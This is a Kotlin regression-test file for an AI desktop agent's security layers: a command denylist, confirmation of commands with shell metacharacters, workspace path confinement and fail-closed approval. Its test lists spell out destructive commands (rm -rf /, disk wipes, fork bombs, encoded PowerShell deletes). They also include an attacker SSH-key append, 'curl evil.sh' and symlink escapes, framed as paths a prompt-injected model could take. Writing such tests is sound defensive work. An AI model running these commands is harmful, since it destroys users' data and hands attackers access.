// Security hardening batch — standing attack regressions (README "安全加固" §6). Every case here is an
// attack path a prompt-injected model could take; they must stay red-proof forever.
// Copyright (C) OpenMinis contributors. Licensed under the GNU GPL v3 (see LICENSE).
package com.openminis.desktop.security

import com.openminis.desktop.core.AppSettings
import com.openminis.desktop.core.SettingsStore
import com.openminis.desktop.tools.ApprovalRequest
import com.openminis.desktop.tools.MemoryStore
import com.openminis.desktop.tools.ToolApprover
import com.openminis.desktop.tools.ToolRegistry
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import org.json.JSONObject
import java.io.File
import java.nio.file.Files
import java.util.Base64
import kotlin.test.AfterTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNull
import kotlin.test.assertTrue

class AttackRegressionTest {
    private fun tmp(p: String = "om-atk") = Files.createTempDirectory(p).toFile().canonicalFile
    private fun ps(script: String) = Base64.getEncoder().encodeToString(script.toByteArray(Charsets.UTF_16LE))
    private fun blocked(c: String) = assertTrue(CommandGuard.inspect(c).blocked, "must be hard-blocked: $c → ${CommandGuard.inspect(c)}")

    @AfterTest fun reset() = SessionShellApprovals.clear()

    // ------------------------------------------------------------ denylist: POSIX

    @Test fun recursiveDeleteOfRootHomeAndGlob() {
        listOf(
            "rm -rf /", "rm -rf /*", "rm -fr /", "rm -r -f /", "rm -Rf /", "rm --recursive --force /", "rm -rf --no-preserve-root /",
            "rm -rf ~", "rm -rf ~/", "rm -rf ~/*", "rm -rf \$HOME", "rm -rf \"\$HOME\"", "rm -rf \${HOME}/", "rm -rf *", "rm -rf ./*",
            "rm -rf /tmp/../", "rm -rf /tmp/../../*", "rm -rf //", "rm -rf /usr", "rm -rf /etc/", "/bin/rm -rf /",
            "sudo rm -rf /", "nohup rm -rf / &", "ls; rm -rf /", "true && rm -rf ~", "echo ok | rm -rf /", "find / -delete",
            "find ~ -exec rm -rf {} +",
        ).forEach(::blocked)
    }

    @Test fun ifsAndVariableTargetsFailClosed() {
        listOf(
            "rm\${IFS}-rf\${IFS}/", "rm\$IFS-rf\$IFS/", "rm -rf /\$x", "rm -rf /\${dir}", "rm -rf ~/\$x", "rm -rf \"\$STEAMROOT/\"*",
            "rm -rf \$x/", "rm -rf \${TARGET}/*", "rm -rf /`whoami`",
        ).forEach(::blocked)
    }

    @Test fun diskAndPowerAndPermissions() {
        listOf(
            "mkfs.ext4 /dev/sda1", "mkfs -t vfat /dev/sdb", "/sbin/mkfs.xfs /dev/nvme0n1p2",
            "dd if=/dev/zero of=/dev/sda", "dd if=/dev/zero of = /dev/sda bs=1M", "dd of=/dev/nvme0n1 if=x",
            "echo x > /dev/sda", "cat img >/dev/sdb1", "printf x >> /dev/nvme0n1",
            "shred -n 3 /dev/sda", "wipefs -a /dev/sdb",
            ":(){ :|:& };:", ":() { : | : & } ; :", "bomb(){ bomb|bomb& };bomb",
            "shutdown -h now", "shutdown now", "poweroff", "reboot", "halt", "init 0", "systemctl reboot",
            "chmod -R 777 /", "chmod -R 000 ~", "chown -R nobody /",
            "mv /etc/passwd /", "mv ~ /tmp/x", "mv * /",
        ).forEach(::blocked)
    }

    // ------------------------------------------------------------ denylist: nested payloads

    @Test fun nestedPayloadsAreRescanned() {
        listOf(
            "sh -c \"rm -rf /\"", "bash -c 'rm -rf ~'", "bash -lc 'cd /tmp && rm -rf /'", "zsh -c 'mkfs.ext4 /dev/sda'",
            "eval \"rm -rf /\"", "eval 'rm' '-rf' '/'", "sh -c \"bash -c 'eval \\\"rm -rf /\\\"'\"",
            "echo \$(rm -rf /)", "echo `rm -rf ~`", "x=\$(dd if=/dev/zero of=/dev/sda)",
            "env rm -rf /", "xargs rm -rf /", "timeout 5 rm -rf /", "wsl rm -rf /", "wsl.exe -e bash -c 'rm -rf /'",
            "busybox rm -rf /", "sudo -u root bash -c 'rm -rf /'",
        ).forEach(::blocked)
    }

    @Test fun powershellEncodedCommandIsDecodedAndRescanned() {
        blocked("powershell -EncodedCommand ${ps("Remove-Item -Recurse -Force C:\\")}")
        blocked("powershell.exe -NoProfile -enc ${ps("rm -r -fo \$env:USERPROFILE")}")
        blocked("pwsh -e ${ps("Stop-Computer -Force")}")
        blocked("pwsh -ec ${ps("cmd /c \"rd /s /q C:\\\"")}")
        // nested: encoded inside encoded
        blocked("powershell -EncodedCommand ${ps("powershell -EncodedCommand " + ps("Format-Volume -DriveLetter C"))}")
        // undecodable → fail-closed
        blocked("powershell -EncodedCommand !!!not-base64!!!")
        blocked("powershell -EncodedCommand")
        blocked("powershell -enc QUJD") // odd byte count, not UTF-16LE
        // harmless encoded command is NOT blocked (needs confirmation as usual)
        assertEquals(CommandGuard.Decision.CONFIRM, CommandGuard.inspect("powershell -EncodedCommand ${ps("Get-Date")}").decision)
    }

    // ------------------------------------------------------------ denylist: Windows

    @Test fun windowsDestructiveCommands() {
        listOf(
            "rd /s /q C:\\", "RD /S /Q C:\\", "rmdir /s /q c:\\", "rmdir /s %USERPROFILE%", "rd /s /q %SystemRoot%", "rd /s /q C:\\Windows",
            "rd /s /q \"C:\\Program Files\"", "rd /s /q C:\\Users", "rd /s /q \\\\server\\share",
            "del /s /q C:\\*", "del /f /s /q C:\\*.*", "erase /s C:\\", "del /s /q %USERPROFILE%\\*",
            "format C:", "FORMAT D: /q", "diskpart", "diskpart /s wipe.txt", "cipher /w:C:\\", "bcdedit /delete {current}",
            "vssadmin delete shadows /all /quiet", "wmic shadowcopy delete", "wbadmin delete catalog -quiet",
            "reg delete HKLM\\SYSTEM\\CurrentControlSet /f", "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\" /f",
            "shutdown /s /t 0", "shutdown /r /f", "shutdown -s", "Stop-Computer", "Restart-Computer -Force", "stop-computer -force",
            "Remove-Item -Recurse -Force C:\\", "Remove-Item C:\\* -Recurse", "remove-item -r -fo \$env:USERPROFILE", "ri -Recurse ~",
            "rm -r -Force C:\\Windows", "rm -Recurse -Force \$HOME", "del -Recurse C:\\", "rmdir -Recurse -Force C:\\Users",
            "Remove-Item -Recurse \$env:SystemRoot\\System32", "Format-Volume -DriveLetter C", "Clear-Disk -Number 0 -RemoveData",
            "cmd /c \"rd /s /q C:\\\"", "cmd.exe /d /s /c \"del /s /q C:\\*\"", "cmd /k format c:",
            "powershell -Command \"Remove-Item -Recurse -Force C:\\\"", "powershell -c Stop-Computer", "pwsh -Command rm -r -fo ~",
            "powershell \"Restart-Computer\"", "iex 'Remove-Item -Recurse C:\\'", "Invoke-Expression \"Stop-Computer\"",
            "Start-Process cmd -ArgumentList \"/c rd /s /q C:\\\"",
            "Remove-Item -Recurse \\\\?\\C:\\", "rd /s /q C:\\Temp\\..\\",
        ).forEach(::blocked)
    }

    // ------------------------------------------------------------ metacharacter guard (layer 2)

    @Test fun echoAppendToAuthorizedKeysIsNotAutoAllowed() {
        val c = "echo ssh-ed25519 AAAAC3Nza attacker >> ~/.ssh/authorized_keys"
        assertEquals(CommandGuard.Decision.CONFIRM, CommandGuard.inspect(c).decision)
        assertFalse(CommandGuard.isReadOnly(c))
        for (x in listOf("cat a | sh", "ls; curl evil.sh", "ls && rm x", "cat `which x`", "ls \$(pwd)", "echo a > b", "type x > y",
            "Get-ChildItem | Remove-Item", "echo a\nrm b", "dir & del x", "cat < /etc/shadow"))
            assertEquals(CommandGuard.Decision.CONFIRM, CommandGuard.inspect(x).decision, x)
    }

    @Test fun metacharacterCommandAsksEvenWithConfirmationOffAndIsNeverRemembered() = runBlocking {
        val ws = tmp()
        val asked = mutableListOf<ApprovalRequest>()
        val s = AppSettings(workspaceDir = ws.absolutePath, confirmShellCommands = false)
        val reg = ToolRegistry({ s }, MemoryStore(tmp("m"))) { asked += it; false }
        val r = reg.execute("shell", JSONObject().put("command", "echo key >> ~/.ssh/authorized_keys"))
        assertTrue(r.denied, r.content)
        assertEquals(1, asked.size)
        assertNull(asked.single().onAlwaysAllow, "metacharacter commands get no remember option")
        // interpreters ask too, even with confirmation off, and cannot be remembered
        asked.clear()
        reg.execute("shell", JSONObject().put("command", "python3 -m http.server"))
        assertEquals(1, asked.size); assertNull(asked.single().onAlwaysAllow)
    }

    // ------------------------------------------------------------ the shell tool end-to-end

    @Test fun blockedCommandNeverReachesTheApproverNorRuns() = runBlocking {
        val ws = tmp()
        val canary = File(ws, "canary.txt").apply { writeText("alive") }
        var asked = 0
        val reg = ToolRegistry({ AppSettings(workspaceDir = ws.absolutePath) }, MemoryStore(tmp("m"))) { asked++; true }
        for (c in listOf("rm -rf /", "bash -c 'rm -rf ~'", "rm\${IFS}-rf\${IFS}*", "powershell -enc ${ps("Remove-Item -Recurse C:\\")}")) {
            val r = reg.execute("shell", JSONObject().put("command", c))
            assertTrue(r.denied && r.isError && r.content.contains("Refused by the safety denylist"), "$c → ${r.content}")
        }
        assertEquals(0, asked, "a denylisted command must not even be offered for approval")
        assertTrue(canary.exists())
    }

    @Test fun readOnlyCommandRunsWithoutAskingAndFalsePositiveStillAsks() = runBlocking {
        val ws = tmp()
        val asked = mutableListOf<String>()
        val reg = ToolRegistry({ AppSettings(workspaceDir = ws.absolutePath) }, MemoryStore(tmp("m"))) { asked += it.detail; false }
        reg.execute("shell", JSONObject().put("command", "ls -la"))
        assertTrue(asked.isEmpty(), "ls -la is auto-approved: $asked")
        val r = reg.execute("shell", JSONObject().put("command", "rm -rf ./build"))
        assertTrue(r.denied && !r.content.contains("denylist"), r.content)
        assertEquals(listOf("rm -rf ./build"), asked)
    }

    @Test fun sessionAllowIsInMemoryOnlyAndExcludesInterpreters() = runBlocking {
        val ws = tmp()
        val asked = mutableListOf<ApprovalRequest>()
        val reg = ToolRegistry({ AppSettings(workspaceDir = ws.absolutePath) }, MemoryStore(tmp("m"))) { req ->
            asked += req; req.onAlwaysAllow?.invoke(); true
        }
        reg.execute("shell", JSONObject().put("command", "mkdir made"))
        assertEquals(1, asked.size); assertEquals("Allow for this session", asked.single().rememberLabel)
        reg.execute("shell", JSONObject().put("command", "mkdir made"))
        assertEquals(1, asked.size, "the exact command is remembered for this session")
        assertTrue(SessionShellApprovals.contains("mkdir made"))
        assertFalse(SessionShellApprovals.add("python3 evil.py"))
        assertFalse(SessionShellApprovals.add("bash -c 'ls'"))
        assertFalse(SessionShellApprovals.add("ls; rm x"))
        assertFalse(SessionShellApprovals.snapshot().any { CommandGuard.isInterpreter(it) })
    }

    // ------------------------------------------------------------ persistence (layer 7)

    @Test fun oldShellAlwaysAllowInSettingsIsMigratedAway() {
        val dir = tmp()
        val f = File(dir, "settings.json")
        // what the previous "Always allow" on a shell approval left behind
        f.writeText("""{"confirmShellCommands": false, "confirmWritesOutsideWorkspace": false, "shellTimeoutSeconds": 77}""")
        val s = SettingsStore(f).load()
        assertTrue(s.confirmShellCommands, "shell confirmation is back on after the migration")
        assertEquals(77, s.shellTimeoutSeconds)
        assertEquals(SettingsStore.SECURITY_REVISION, s.securityRevision)
        assertFalse(f.readText().contains("confirmWritesOutsideWorkspace"), "old outside-workspace override is dropped")
        // once migrated, the user's own later choice sticks
        SettingsStore(f).save(s.copy(confirmShellCommands = false))
        assertFalse(SettingsStore(f).load().confirmShellCommands)
    }

    @Test fun shellApprovalNeverPersistsAnything() = runBlocking {
        val dir = tmp()
        val f = File(dir, "settings.json")
        val store = SettingsStore(f)
        store.save(AppSettings(workspaceDir = tmp().absolutePath, securityRevision = SettingsStore.SECURITY_REVISION))
        val before = f.readText()
        val reg = ToolRegistry({ store.load() }, MemoryStore(tmp("m"))) { it.onAlwaysAllow?.invoke(); true }
        reg.execute("shell", JSONObject().put("command", "mkdir a"))
        reg.execute("shell", JSONObject().put("command", "python3 -V"))
        assertEquals(before, f.readText(), "no shell approval may touch settings.json")
        assertTrue(dir.listFiles()!!.map { it.name }.toSet() == setOf("settings.json"), dir.listFiles()!!.map { it.name }.toString())
    }

    // ------------------------------------------------------------ path confinement (layer 4) via the tools

    @Test fun fileToolsRefuseOutsideTraversalAndSymlinkEscape() = runBlocking {
        val ws = tmp(); val outside = tmp("om-outside")
        val secret = File(outside, "secret.txt").apply { writeText("TOP-SECRET") }
        var asked = 0
        val reg = ToolRegistry({ AppSettings(workspaceDir = ws.absolutePath) }, MemoryStore(tmp("m"))) { asked++; true }
        suspend fun call(tool: String, vararg kv: Pair<String, String>) = reg.execute(tool, JSONObject().apply { kv.forEach { put(it.first, it.second) } })

        assertTrue(call("file_write", "path" to File(outside, "x.txt").absolutePath, "content" to "x").denied)
        assertFalse(File(outside, "x.txt").exists())
        assertTrue(call("file_write", "path" to "../escape.txt", "content" to "x").denied)
        assertFalse(File(ws.parentFile, "escape.txt").exists())
        assertTrue(call("file_read", "path" to secret.absolutePath).denied)
        assertTrue(call("file_edit", "path" to secret.absolutePath, "old_string" to "TOP", "new_string" to "X").denied)
        assertTrue(call("list_dir", "path" to outside.absolutePath).denied)
        assertTrue(call("file_write", "path" to "~/.ssh/authorized_keys", "content" to "k").denied)
        assertTrue(call("file_write", "path" to "a.txt:hidden", "content" to "k").denied)
        assertEquals(0, asked, "path refusals are hard: no dialog")

        val linked = try { Files.createSymbolicLink(File(ws, "link").toPath(), outside.toPath()); true } catch (e: Exception) { println("SKIP symlink: $e"); false }
        if (linked) {
            assertTrue(call("file_read", "path" to "link/secret.txt").denied)
            assertTrue(call("file_write", "path" to "link/planted.txt", "content" to "x").denied)
            assertFalse(File(outside, "planted.txt").exists())
            assertTrue(call("list_dir", "path" to "link").denied)
        }
        assertEquals("TOP-SECRET", secret.readText())
        // inside still works
        assertFalse(call("file_write", "path" to "ok/inside.txt", "content" to "fine").isError)
        assertTrue(call("file_read", "path" to "ok/inside.txt").content.contains("fine"))
    }

    @Test fun readRootsAreReadOnly() = runBlocking {
        val ws = tmp(); val skills = tmp("om-sk")
        val md = File(skills, "s/SKILL.md").apply { parentFile.mkdirs(); writeText("---\nname: s\n---\nbody") }
        val reg = ToolRegistry({ AppSettings(workspaceDir = ws.absolutePath) }, MemoryStore(tmp("m")), { true }, { listOf(skills) })
        assertTrue(reg.execute("file_read", JSONObject().put("path", md.absolutePath)).content.contains("body"))
        assertTrue(reg.execute("file_write", JSONObject().put("path", md.absolutePath).put("content", "pwned")).denied)
        assertTrue(md.readText().contains("body"))
    }

    // ------------------------------------------------------------ fail-closed (layer 5)

    private val probe = ApprovalRequest("shell", "Run", "mkdir x")

    @Test fun approverExceptionDenies() = runBlocking {
        assertFalse(FailClosedApprover(ToolApprover { throw IllegalStateException("dialog crashed") }).approve(probe))
        assertFalse(FailClosedApprover(ToolApprover { throw OutOfMemoryError("x") }).approve(probe))
        // through the tool: the command does not run
        val ws = tmp()
        val r = ToolRegistry({ AppSettings(workspaceDir = ws.absolutePath) }, MemoryStore(tmp("m"))) { throw RuntimeException("no UI") }
            .execute("shell", JSONObject().put("command", "mkdir should-not-exist"))
        assertTrue(r.denied, r.content)
        assertFalse(File(ws, "should-not-exist").exists())
    }

    @Test fun noWindowDenies() = runBlocking {
        var called = false
        assertFalse(FailClosedApprover(ToolApprover { called = true; true }, available = { false }).approve(probe))
        assertFalse(called, "without a window the user is never asked and nothing is allowed")
        assertFalse(FailClosedApprover(ToolApprover { true }, available = { error("AWT gone") }).approve(probe))
    }

    @Test fun timeoutDenies() = runBlocking {
        assertFalse(FailClosedApprover(ToolApprover { delay(5_000); true }, timeoutMs = 50).approve(probe))
        assertTrue(FailClosedApprover(ToolApprover { true }, timeoutMs = 5_000).approve(probe))
    }

    @Test fun cancellationIsNotAnAllow() = runBlocking {
        val r = runCatching {
            kotlinx.coroutines.withTimeout(100) { FailClosedApprover(ToolApprover { delay(10_000); true }).approve(probe) }
        }
        assertTrue(r.isFailure, "user Stop propagates as cancellation (the call is not allowed)")
    }
}
